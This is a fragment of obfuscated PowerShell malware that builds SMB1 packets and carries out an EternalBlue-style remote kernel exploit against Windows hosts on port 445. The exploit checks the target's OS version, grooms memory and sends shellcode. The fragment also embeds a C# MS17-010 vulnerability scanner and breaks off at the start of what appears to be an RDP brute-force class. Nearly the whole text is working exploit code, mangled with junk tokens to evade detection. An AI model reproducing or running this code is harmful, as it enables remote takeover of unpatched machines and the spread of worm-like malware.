	wB69pkt += 0xa1,0x4e,0x30,0x4c,0xa2,0x4a,0x04,0x48,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x4e,0x00,0x55,0x00,0x4c,0x00,0x4c,0x00

    				

    wB69pkt += 0x55,0x6e,0x69,0x78,0x00  

    wB69pkt += 0x53,0x61,0x6d,0x62,0x61,0x00

    return wB69pkt

}

function smb1_login8(wB69sock){

    wB69raw_proto = maKe_smBir81_ir8Lir8oGIn8ir8_PACir8keir8T8

    wB69sock.Send(wB69raw_proto) uOva OUir8Tir8-NulL

    wB69raw, wB69smbheader=SMbir81_Geir8T_Reir8spir8Oir8NsE8(wB69sock)

    wB69raw_proto = mAir8Kir8Eir8_nTlM_ir8AUir8TH_pACKEir8T8(wB69smbheader.user_id)

    wB69sock.Send(wB69raw_proto) uOva OUir8T-ir8Null

    return Smir8B1_gir8eT_Reir8Spir8ONir8SE8(wB69sock)

    


}

function negotiate_proto_request8(wB69use_ntlm)

{ 

      [Byte[]]  wB69pkt = [Byte[]] (0x00) '+'        

      wB69pkt += 0x00,0x00,0x2f     

      wB69pkt += 0xFF,0x53,0x4D,0x42 

      wB69pkt += 0x72            

      wB69pkt += 0x00,0x00,0x00,0x00 

      wB69pkt += 0x18           

      if(wB69use_ntlm){ wB69pkt +=  0x01,0x48 }

      else{ wB69p'+'kt +=  0x01,0x40 }         

      wB69pkt += 0x00,0x00       

      wB69pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 

      wB69pkt += 0x00,0x00      

      wB69pkt += 0xff,0xff    

      wB69pkt += 0x2F,'+'0x4B        

      wB69pkt += 0x00,0x00    

      wB69pkt += 0x00,0x00      

      wB69pkt += 0x00        

      wB69pkt += 0x0c,0x00       

      wB69pkt += 0x02           

      wB69pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   

      return wB69pkt

}

function smb_header8(wB69smbheader) {

wB69parsed_header =@{server_component=wB69smbheader[0..3];

                  smb_command=wB69smbheader[4];

                  error_class=wB69smbheader[5];

                  reserved1=wB69smbheader[6];

                  error_code=wB69smbheader[7..8];

                  flags=wB69smbheader[9];

                  flags2=wB69smbheader[10..11];

                  process_id_high=wB69smbheader[12..13];

                  signature=wB69smbheader[14..21];

                  reserved2=wB69smbheader[22..23];

                  tree_id=wB69smbheader[24..25];

                  process_id=wB69smbheader[26..27];

                  user_id=wB69smbheader[28..29];

                  multiplex_id=wB69smbheader[30..31];

                 }

return wB69parsed_header

}


function smb1_get_response8(wB69sock){

    wB69sock.ReceiveTimeout =5000

    wB69tcp_response = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 1024)

    try{

    wB69soc'+'k.Receive(wB69tcp_response)uOva OUt-NUir8ll

     }

     catch {

      return -1,-1

     }

    wB69netbios = wB69tcp_response[0..4]

    wB69smb_header8 = wB69tcp_response[4..36]  

    wB69parsed_header = Sir8Mir8B_HeAdeir8R8(wB69smb_header8)  

    return wB69tcp_response, wB69parsed_header


}



function client_negotiate8(wB69sock , wB69use_ntlm){

    wB69raw_proto = Negotir8Iair8TE_Pir8ROTir8O_requEST8(wB69use_ntlm)

    wB69sock.Send(wB69raw_proto) uOva outir8-ir8NulL

    return smb1_gir8eT_rir8ESir8Ponir8se8(wB69sock)


}

function tree_connect_andx8(wB69sock, wB69target, wB69userid){

    wB69raw_proto = trir8Ee_conneCT_aNir8Dxir88_Rir8eQuESt wB69target wB69userid

    wB69sock.Send(wB69raw_proto) uOva OUT-Nuir8lL

   return Sir8Mb1_Get_ir8Reir8sir8ponir8se8(wB69sock)

}

function tree_connect_andx8_request(wB69target, wB69userid) { 


     [Byte[]] wB69pkt = [Byte[]](0x00)            

     wB69pkt +=0x00,0x00,0x48       

     wB69pkt +=0xFF,0x53,0x4D,0x42  

     wB69pkt +=0x75            

     wB69pkt +=0x00,0x00,0x00,0x00  

     wB69pkt +=0x18             

     wB69pkt +=0x01,0x48         

     wB69pkt +=0x00,0x00          

     wB69pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 

     wB69pkt +=0x00,0x00         

     wB69pkt +=0xff,0xff        

     wB69pkt +=0x2F,0x4B        

     wB69pkt += wB69userid           

     wB69pkt +=0x00,0x00      

    wB69ipc = ((utH9waJwaJutH9).replACE(utH9waJutH9,[StrInG][CHar]92))+ wB69target + NDck9e0IPCwB69NDck

     wB69pkt +=0x04              

     wB69pkt'+' +=0xFF             

     wB69pkt +=0x00             

     wB69pkt +=0x00,0x00       

     wB69pkt +=0x00,0x00        

     wB69pkt +=0x01,0x00      

	 wB69al=[system.Text.Encoding]::ASCII.GetBytes(wB69ipc).Count+8

	 wB69pkt+=[bitconverter]::GetBytes(wB69al)[0],0x00

     wB69pkt +=0x00              

     wB69pkt += [system.Text.Encoding]::ASCII.GetBytes(wB69ipc) 

     wB69pkt += 0x00       

     wB69pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00 

	wB69len = wB69pkt.Length - 4

	wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

	wB69pkt[1] = wB69hexlen[0]

	wB69pkt[2] = wB69hexlen[1]

	wB69pkt[3] = wB69hexlen[2]

    return wB69pkt

    }


function make_smb1_nt_trans_packet8(wB69tree_id, wB69user_id) { 


    [Byte[]]  wB69pkt = [Byte[]] (0x00)                 

    wB69pkt += 0x00,0x08,0x3C           

    wB69pkt += 0xff,0x53,0x4D,0x42       

    wB69pkt += 0xa0                

    wB69pkt += 0x00,0x00,0x00,0x00      

    wB69pkt += 0x18   

    wB69pkt += 0x01,0x48

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00 

    wB69pkt += 0x00,0x00

    wB69pkt += wB69tree_id 

    wB69pkt += 0x2f,0x4b 

    wB69pkt += wB69user_id  

    wB69pkt += 0x00,0x00 


    wB69pkt += 0x14           

    wB69pkt += 0x01          

    wB69pkt += 0x00,0x00  

    wB69pkt += 0x1e,0x00,0x00,0x00 

    wB69pkt += 0x49,0x01,0x01,0x00  

    wB69pkt += 0x1e,0x00,0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x1e,0x00,0x00,0x00 

    wB69pkt += 0x4c,0x00,0x00,0x00 

    wB69pkt += 0x49,0x01,0x00,0x00 

    wB69pkt += 0x6c,0x00,0x00,0x00

    wB69pkt += 0x01

    wB69pkt += 0x00,0x00  

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x6a,0x01 

    wB69pkt += 0xff

    wB69pkt += [Byte[]] (0x00) * 0x1e 

    wB69pkt += 0xff,0xff,0x00,0x00,0x01

    wB69pkt += [Byte[]](0x00) * 0x146

    wB69len = wB69pkt.Length - 4

    wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

    wB69pkt[1] = wB69hexlen[0]

    wB69pkt[2] = wB69hexlen[1]

    wB69pkt[3] = wB69hexlen[2]

    return wB69pkt

  }

  

function make_smb1_trans2_exploit_packet8(wB69tree_id, wB69user_id, wB69data, wB69timeout) {

    

    wB69timeout = (wB69timeout * 0x10) + 1

    [Byte[]]  wB69pkt = [Byte[]] (0x00)

    wB69pkt += 0x00,0x10,0x38 

    wB69pkt += 0xff,0x53,0x4D,0x42 

    wB69pkt += 0x33

    wB69pkt += 0x00,0x00,0x00,0x00 

    wB69pkt += 0x18

    wB69pkt += 0x01,0x48

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00 

    wB69pkt += 0x00,0x00
'+'
    wB69pkt += wB69tree_id 

    wB69pkt += 0x2f,0x4b

    wB69pkt += wB69user_id 

    wB69pkt += 0x00,0x00 


    wB69pkt += 0x09   

    wB69pkt += 0x00,0x00    

    wB69pkt += 0x00,0x10  

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x00,0x00

    wB69pkt += 0x00 

    wB69pkt += 0x00 

    wB69pkt += 0x00,0x10  

    wB69pkt += 0x38,0x00,0x49

    wB69pkt += [bitconverter]::GetBytes(wB69timeout)[0]

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x03,0x10


    wB69pkt += 0xff,0xff,0xff  

    wB69pkt +=wB69data  

    wB69len = wB69pkt'+'.Length - 4

    wB69hexlen = [bitconverter]::GetBytes(wB69len)[-2..-4]

    wB69pkt[1] = wB69hexlen[0]

    wB69pkt[2] = wB69hexlen[1]

    wB69pkt[3] = wB69hexlen[2]    

    return wB69pkt    

}   

    

function send_big_trans28(wB69sock, wB69smbheader, wB69data, wB69firstDataFragmentSize, wB69sendLastChunk){


    wB69nt_trans_pkt = Mir8Air8ke_ir8sMb1_ir8Nt_tRaNS_ir8pAir8Cir8kET8 wB69smbheader.tree_id wB69smbhea'+'der.user_id

    wB69sock.Send(wB69nt_trans_pkt) uOva OuTir8-ir8NUll


    wB69raw, wB69transheader = sMb1ir8_gET_Rir8eSir8PONsE8(wB69sock)

    if (!(wB69transheader.error_class -eq 0x00 -and (wB69transheader.reserved1 -eq 0x00) -and (wB69transheader.error_code[0] -eq 0x00) -and (wB69transheader.error_code[1] -eq 0x00)))

    {

    return -1,-1

    }

    

    wB69i=wB69firstDataFragmentSize

    wB69timeout=0

    while (wB69i -lt wB69data.count)

    {

        wB69sendSize=[System.Math]::Min(4096,(wB69data.count-wB69i))

        if ((wB69data.count-wB69i) -le 4096){

         if (!wB69sendLastChunk)

            { break }

         }

        wB69trans2_pkt = mir8Akir8E_Smb1_Trir8ANs2_EXir8Pir8Loiir8T_PaCKeT8 wB69smbheader.tree_id wB69smbheader.user_id wB69data[wB69i..(wB69i+wB69sendSiz'+'e-1)] wB69timeout

        wB69sock.Send(wB69trans2_pkt) uOva oUTir8-NUir8lL

        wB69timeout+=1

        wB69i +=wB69sendSize

    } 

    if (wB69sendLastChunk)

    {Smb1_gET_rEsPir8ONir8sir8e8(wB69sock) }

    return wB69i,wB69timeout

}

function createSessionAllocNonPaged8(wB69target, wB69size) {

   wB69client = NEW-oir8Bir8JECT System.Net.Sockets.TcpClient(wB69target,445)

   wB69sock = wB69client.Client

   ClIir8eNtir8_ir8NEgOtir8IaTe8 wB69sock wB69false uOva Ouir8Tir8-nuLl

   wB69flags2=16385

   if (wB69size -ge 0xffff)

   { wB69reqsize=wB69size /2}

   else

   {

     wB69flags2 =49153

     wB69reqsize= wB69size

   }

    

    wB69a=[bitconverter]::GetBytes(wB69reqsize)

    wB69b=[bitconverter]::GetBytes(wB69flags2)

    wB69pkt =  maKir8E_ir8sir8mB1ir8_frEir8Eir8_Hoir8LE_Sir8ESsiir8ON_PAcKir8Et8 (wB69b[0],wB69b[1]) (0x02,0x00) (wB69a[0],wB69a[1],0x00,0x00,0x00)


    wB69sock.Send(wB69pkt) uOva Oir8Ut-NULL

    SmBir81_ir8GeT_REir8SpOnSir8E8(wB69sock) uOva Ouir8T-ir8NuLl

    return wB69sock

}

function  make_smb1_free_hole_session_packet8(wB69flags2, wB69vcnum, wB69native_os) { 

     

    [Byte[]] wB69pkt = 0x00       

    wB69pkt +='+' 0x00,0x00,0x51      

    wB69pkt += 0xff,0x53,0x4D,0x42      

    wB69pkt += 0x73   

    wB69pkt '+'+= 0x00,0x00,0x00,0x00 

    wB69pkt += 0x18 

    wB69pkt += wB69flags2  

    wB69pkt += 0x00,0x00 

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00,0x00,0x00

    wB69pkt += 0x00,0x00

    wB69pkt += 0xff,0xff 

    wB69pkt += 0x2f,0x4b

    wB69pkt += 0x00,0x00  

    wB69pkt += 0x00,0x00  

    wB69pkt += 0x0c 

    wB69pkt += 0xff  

    wB69pkt += 0x00  

    wB69pkt += 0x00,0x00   

    w'+'B69pkt += 0x00,0xf0 

    wB69pkt += 0x02,0x00 

    wB69pkt += wB69vcnum  

    wB69pkt += 0x00,0x00,0x00,0x00  

    wB69pkt += 0x00,0x00    

    wB69pkt += 0x00,0x00,0x00,0x00 

    wB69pkt += 0x40,0x00,0x00,0x80  

    wB69pkt += 0x16,0x00     

    wB69pkt += wB69native_os

    wB69pkt += [Byte[]] (0x00) * 17  

    return wB69pkt

  }


function make_smb2_payload_headers_packet8(wB69for_nx){

    [Byte[]] wB69pkt = [Byte[]](0x00,0x00,0x81,0x00) + [system.Text.Encoding]::ASCII.GetBytes((utH9BAutH9+utH9ADutH9)) 

    if (wB69for_nx){ wB69pkt+=[Byte[]](0x00)*123 }

    else{ wB69pkt+=[Byte[]](0x00)*124  }

    return wB69pkt

}


function '+'eb8(wB69target,wB69sc) {  

    wB69NTFEA_SIZE8 = 0x9000

	wB69ntfea9000=[byte[]]0x00*0xbe0

	wB69ntfea9000 +=0x00,0x00,0x5c,0x73+[byte[]]0x00*0x735d

	wB69ntfea9000 +=0x00,0x00,0x47,0x81+[byte[]]0x00*0x8148

	

    wB69TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000

    wB69SHELLCODE_PAGE_ADDR =  0xffffffffffd04000

    wB69PTE_ADDR=0xfffff6ffffffe820


    wB69fakeSrvNetBufferX64Nx =@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0'+'0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa8,0xe7,0xff,0xff,0xff,0xf6,0xff,0xff)


    [byte[]]wB'+'69feaListNx=[byte[]](0x00,0x00,0x01,0x00)

    wB69feaListNx += wB69ntfea9000

    wB69feaListNx +=0x00,0x00,0xaf,0x00+ wB69fakeSrvNetBufferX64Nx

    wB69feaListNx +=0x12,0x34,0x78,0x56

    [byte[]]wB69fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x41,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x7e,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x41,0xd0,0xff,0xff,0xff,0xff,0xff)

    wB69feaList = cREAtEir8FEaLir8iir8Sir8T8 wB69sc.length  wB69ntfea9000  


    wB69client = New-ir8OBir8jecT System.Net.Sockets.TcpClient(wB69target,445)  

    wB69sock = wB69client.Client

    cLIENT_nir8Eir8Gotir8IATE8 wB69sock wB69true uOva Outir8-nir8ULl

    wB69raw, wB69smbheader = Sir8mB1_lOgir8In8 wB69sock

    wB69os=[system.Text.Encoding]::ascii.GetString(wB69raw[45..(wB69raw.count-1)]).ToLower()

	if (wB69os.contains((utH9wiutH9+utH9ndutH9+utH9ows 10 utH9)))

    {

        wB69b=[int]wB69os.split(NDck NDck)[-1]

        if (wB69b -ge 14393) {return wB69False}

    }

		

    if (!((wB69os.contains((utH9wiutH9+utH9ndows utH9+utH98utH9))) -or (wB69os.contains((utH9winutH9+utH9dowutH9+utH9sutH9)) -and wB69os.contains((utH920utH9+utH912utH9)))))

    {return wB69False}

	wB69sock.ReceiveTimeout =5000 

    wB69raw, wB69smbheader = Tree_CONNEir8cT_ir8ANir8dX8 wB69sock wB69target wB69smbheader.user_id

     

     

    wB69progress , wB69timeout= sir8END_bIir8G_tRAnir8S28 wB69sock wB69smbheader wB69feaList (wB69feaList.length%4096) wB69False  

    if ((wB69progress -eq -1) -and (wB69timeout -eq -1))

    {return wB69false}

    

    wB69client2 = neW-obJir8eir8CT System.Net.Sockets.TcpClient(wB69target,445)  

    wB69sock2 = wB69client2.Client

    cLir8iir8Ent_ir8NeGotiatir8e8 wB69sock2 wB69true uOva Oir8Uir8T-NulL

    wB69raw, wB69smbheader_t = smB1_ir8Lir8OGIN8 wB69sock2

    wB69raw, wB69smbheader2 = Trir8ee_cOir8Nir8NeCt_ANir8DX8 wB69sock2 wB69target wB69smbheader_t.user_id

    wB69progress2 , wB69timeout2= SEnir8Dir8_big_TrANSir828 wB69sock2 wB69smbheader2 wB69feaListNx (wB69feaList.length%4096) wB69False  

    if ((wB69progress2 -eq -1) -and (wB69timeout2 -eq -1))

    {return wB69false}

    

    

    wB69allocConn = crir8eir8Air8TESesSIOir8Nir8AllOCNir8onpair8GED8 wB69target (wB69NTFEA_SIZE8 - 0x2010)   

     

     wB69payload_hdr_pkt = MAKir8E_sir8Mbir82_ir8pAYLOaD_Heair8dersir8_pAcKeir8T8(wB69true)

     wB69groom_socks =@()

     for (wB69i=0; wB69i -lt 13; wB69i++)

     {

        wB69client = neir8W-Objir8eir8ct System.Net.Sockets.TcpClient(wB69target,445)

        wB69client.NoDelay = wB69true

        wB69gsock = wB69client.Client

        wB69groom_socks += wB69gsock

        wB69gsock.Send(wB69payload_hdr_pkt) uOva oir8Utir8-Null  

     }

    wB69holeConn = CReaTir8eir8Sesir8SiOir8NaLLoCnONPaGed8 wB69target (wB69NTFEA_SIZE8 - 0x10)

    wB69allocConn.close()

    for (wB69i=0; wB69i -lt 5; wB69i++)

     {

         wB69client = Nir8EW-ObJir8ect System.Net.Sockets.TcpClient(wB69target,445)

         wB69client.NoDelay = wB69true

         wB69gsock = wB69client.Client    

         wB69groom_socks += wB69gsock

         wB69gsock.Send(wB69payload_hdr_pkt) uOva oir8Ut-null  

     }

    wB69holeConn.close()

    

    wB69trans2_pkt2 = mAkE_Smir8B1_TRaNS2ir8_Eir8Xir8pLoit_pAir8Cir8ket8 wB69smbheader2.tree_id wB69smbheader2.user_id wB69feaListNx[wB69progress2..wB69feaListNx.count] wB69timeout2

    wB69sock2.Send(wB69trans2_pkt2) uOva ouT-nir8Uir8ll

    wB69raw2, wB69transheader2 = sMB1_ir8geTir8_REir8sPir8oir8NSE8(wB69sock2)

    if (wB69raw2 -eq -1 -and (wB69transheader2 -eq -1)){return wB69false}

    foreach (wB69sk in wB69groom_socks)

    {

        wB69sk.Send([byte[]]0x00) uOva Ouir8T-Null

    }

    

    wB69trans2_pkt =MAKE_Smir8B1_TRair8Nir8S2_eXPir8Loir8Iir8T_ir8Pair8CKEir8T8 wB69smbheader.tree_id wB69smbheader.user_id wB69feaList[wB69progress..wB69feaList.count] wB69timeout

    wB69sock.Send(wB69trans2_pkt) uOva oir8UTir8-NuLL

    wB69raw, wB69transheader = smBir81_GETir8_Reir8spoir8NSE8(wB69sock)

    if (wB69raw -eq -1 -and (wB69transheader -eq -1)){return wB69false}

    foreach (wB69sk in wB69groom_socks)

    {

        wB69sk.Send(wB69fake_recv_struct + wB69sc) uOva oUir8Tir8-NUll

    }

     foreach (wB69sk in wB69groom_socks)

    {

        wB69sk.close() uOva oUir8T-ir8NulL

    }

    wB69sock.Close()uOva Out-ir8Nir8ULL

    return wB69true  

  }

  

wB69Source = @NDck

using System;

using System.Collections.Generic;

using System.Diagnostics;

using System.IO;

using System.Net;

using System.Net.Sockets;

using System.Text;


namespace PingCastle.Scanners

{

	public class m17sc

	{

		static public bool Scan(string computer)

		{

			TcpClient client = new TcpClient();

			client.Connect(computer, 445);

			try

			{

				NetworkStream stream = client.GetStream();

				byte[] negotiatemessage = GetNegotiateMessage();

				stream.Write(negotiatemessage, 0, negotiatemessage.Length);

				stream.Flush();

				byte[] response = ReadSmbResponse(stream);

				if (!(response[8] == 0x72 && response[9] == 00))

				{

					throw new InvalidOperationException(NDckinvalid negotiate responseNDck);

				}

				byte[] sessionSetup = GetR(response);

				stream.Write(sessionSetup, 0, sessionSetup.Length);

				stream.Flush();

				response = ReadSmbResponse(stream);

				if (!(response[8] == 0x73 && response[9] == 00))

				{

					throw new InvalidOperationException(NDckinvalid sessionSetup responseNDck);

				}

				byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);

				stream.Write(treeconnect, 0, treeconnect.Length);

				stream.Flush();

				response = ReadSmbResponse(stream);

				if (!(response[8] == 0x75 && response[9] == 00))

				{

					throw new InvalidOperationException(NDckinvalid TreeConnect responseNDck);

				}

				byte[] peeknamedpipe = GetPeekNamedPipe(response);

				stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);

				stream.Flush();

				response = ReadSmbResponse(stream);

				if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )

				{

					return true;

				}

			}

			catch (Exception)

			{

				throw;

			}

			return false;

		}


		private static byte[] ReadSmbResponse(NetworkStream stream)

		{

			byte[] temp = new byte[4];

			stream.Read(temp, 0, 4);

			int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;

			byte[] output = new byte[size + 4];

			stream.Read(output, 4, size);

			Array.Copy(temp, output, 4);

			return output;

		}


		static byte[] GetNegotiateMessage()

		{

			byte[] output = new byte[] {

				0x00,0x00,0x00,0x00, 

				0xff,0x53,0x4d,0x42, 

				0x72, 

				0x00, 

				0x00,

				0x00,0x00, 

				0x18, 

				0x01,0x28, 

				0x00,0x00, 

				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

				0x00,0x00, 

				0x00,0x00, 

				0x44,0x6d, 

				0x00,0x00, 

				0x42,0xc1, 

				0x00, 

				0x31,0x00,

				0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00, 

				0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00, 

				0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00, 

				0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00, 

			};

			return EncodeNetBiosLength(output);

		}


		static byte[] GetR(byte[] data)

		{

			byte[] output = new byte[] {

				0x00,0x00,0x00,0x00, 

				0xff,0x53,0x4d,0x42, 

				0x73, 

				0x00, 

				0x00, 

				0x00,0x00, 

				0x18, 

				0x01,0x28, 

				0x00,0x00, 

				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 

				0x00,0x00, 

				data[28],data[29],data[30],data[31],data[32],data[3'+'3],

				0x42,0xc1, 

				0x0d, 

				0xff, 

				0x00, 

				0x00,0x00, 

				0xdf,0xff, 

				0x02,0x00,

				0x01,0x00, 

				0x00,0x00,0x00,0x00, 

				0x00,0x00, 

				0x00,0x00, 

				0x00,0x00,0x00,0x00, 

				0x40,0x00,0x00,0x00, 

				0x26,0x00, 

				0x00,

				0x2e,0x00, 

				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00, 

				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00 

			};

			return EncodeNetBiosLength(output);

		}


		private static byte[] EncodeNetBiosLength(byte[] input)

		{

			byte[] len = BitConverter.GetBytes(input.Length-4);

			input[3] = len[0];

			input[2] = len[1];

			input[1] = len[2];

			return input;

		}


		static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)

		{

			MemoryStream ms = new MemoryStream();

			BinaryReader reader = new BinaryReader(ms);

			byte[] part1 = new byte[] {

				0x00,0x00,0x00,0x00, 

				0xff,0x53,0x4d,0x42, 

				0x75, 

				0x00, 

				0x00, 

				0x00,0x00, 

				0x18, 

				0x01,0x28, 

				0x00,0x00, 

				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

				0x00,0x00, 

				data[28],data[29],data[30],data[31],data[32],data[33],

				0x42,0xc1, 

				0x04, 

				0xff, 

				0x00, 

				0x00,0x00, 

				0x00,0x00, 

				0x01,0x00, 

				0x19,0x00, 

				0x00, 

				0x5c,0x5c};

			byte[] part2 = new byte[] {

				0x5c,0x49,0x50,0x43,0x24,0x00, 

				0x3f,0x3f,0x3f,0x3f,0x3f,0x00

			};

			ms.Write(part1, 0, part1.Length);

			byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);

			ms.Write(encodedcomputer, 0, encodedcomputer.Length);

			ms.Write(part2, 0, part2.Length);

			ms.Seek(0, SeekOrigin.Begin);

			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);

			return EncodeNetBio'+'sLength(output);

		}


		static byte[] GetPeekNamedPipe(byte[] data)

		{

			byte[] output = new byte[] {

				0x00,0x00,0x00,0x00, 

				0xff,0x53,0x4d,0x42,

				0x25, 

				0x00,

				0x00, 

				0x00,0x00, 

				0x18, 

				0x01,0x28, 

				0x00,0x00,

				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 

				0x00,0x00, 

				data[28],data[29],data[30],data[31],data[32],data[33],

				0x42,0xc1,

				0x10, 

				0x00,0x00, 

				0x00,0x00, 

				0xff,0xff, 

				0xff,0xff, 

				0x00, 

				0x00, 

				0x00,0x00,

				0'+'x00,0x00,0x00,0x00, 

				0x00,0x00, 

				0x00,0x00, 

				0x4a,0x00, 

				0x00,0x00,

				0x4a,0x00, 

				0x02,

				0x00, 

				0x23,0x00, 

				0x00,0x00, 

				0x07,0x00, 

				0x5c,0x50,0x49,0x50,0x45,0x5c,0x00 

			};

			return EncodeNetBiosLength(output);

		}

	}

}

NDck@

aDir8d-TYir8pe -TypeDefinition wB69Source


wB69source1=@NDck

using System;

using System.Threading;

using System.Drawing;

using System.Diagnostics;

using System.Comp'+'onentModel;

using System.Collections.Generic;

using System.Text;

using System.Windows.Forms;

using System.Runtime.InteropServices;

using System.Collections;

using System.Reflection;


namespace RDP

{

    public class BRUTE

    {

		private int flag1=-1;

		private bool check_login;

		private Process process;

		

